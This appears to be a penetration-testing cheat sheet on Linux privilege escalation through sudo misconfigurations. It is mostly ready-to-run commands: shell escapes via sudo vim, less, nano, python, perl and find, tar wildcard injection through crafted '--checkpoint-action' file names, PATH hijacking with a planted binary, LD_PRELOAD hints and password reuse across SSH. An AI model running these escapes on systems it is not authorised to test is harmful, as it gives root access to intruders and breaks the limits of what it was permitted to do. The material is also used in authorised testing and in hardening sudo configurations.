# Linux Privilege Escalation – Sudo Misconfigurations

## Purpose

This file provides a structured workflow for identifying and exploiting sudo misconfigurations.

Core rules:

* sudo = controlled privilege escalation
* Misconfigurations often lead to root instantly
* Always check sudo early
* Always map to GTFOBins

---

## 0. Check Sudo Permissions (CRITICAL FIRST STEP)

```bash
sudo -l
```

---

## 1. Key Things to Look For

### NOPASSWD

```text
(user) NOPASSWD: /path/to/binary
```

→ run as root without password

---

### Allowed Commands

```text
(user) /usr/bin/vim
```

→ potential escape to shell

---

### Wildcards

```text
(user) /bin/cat *
```

→ can be abused

---

### ALL Privileges

```text
(user) ALL=(ALL) ALL
```

→ full root access

---

## 2. GTFOBins Mapping (CRITICAL)

Search:

```text
https://gtfobins.github.io/
```

Match binary → exploit method

---

## 3. Common Exploitable Binaries

---

### Vim

```bash
sudo vim -c ':!/bin/bash'
```

---

### Less

```bash
sudo less /etc/hosts
!/bin/bash
```

---

### Nano

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

---

### Python

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

### Perl

```bash
sudo perl -e 'exec "/bin/bash";'
```

---

### Find

```bash
sudo find . -exec /bin/bash \; -quit
```

---

### Bash

```bash
sudo bash
```

---

## 4. Wildcard Abuse

Example:

```text
(user) NOPASSWD: /bin/tar *
```

Exploit:

```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=/bin/bash"
sudo tar -cf archive.tar *
```

---

## 5. Environment Variable Abuse

If allowed:

```bash
sudo -E <command>
```

Try:

* PATH manipulation
* LD_PRELOAD

---

## 6. Sudo + PATH Hijacking

If command uses relative paths:

```bash
echo "/bin/bash" > malicious_binary
chmod +x malicious_binary
export PATH=.:$PATH
sudo vulnerable_command
```

---

## 7. Sudo + Script Execution

If script allowed:

```bash
sudo /path/script.sh
```

Modify script if writable.

---

## 8. Check Sudo Version (CVE)

```bash
sudo --version
```

Search for:

* known vulnerabilities

---

## 9. Credential Reuse

If password required:
→ test same password on:

* SSH
* other users

---

## 10. If Stuck

RESET:

* re-read sudo -l carefully
* check GTFOBins again
* try different escape methods
* look for wildcard abuse

---

## 11. Mental Model

* sudo = controlled root
* misconfig = full root
* binary = escape vector

---

## 12. Golden Rules

* Always run sudo -l early
* Always check GTFOBins
* Always try shell escapes
* Do not overcomplicate—execute
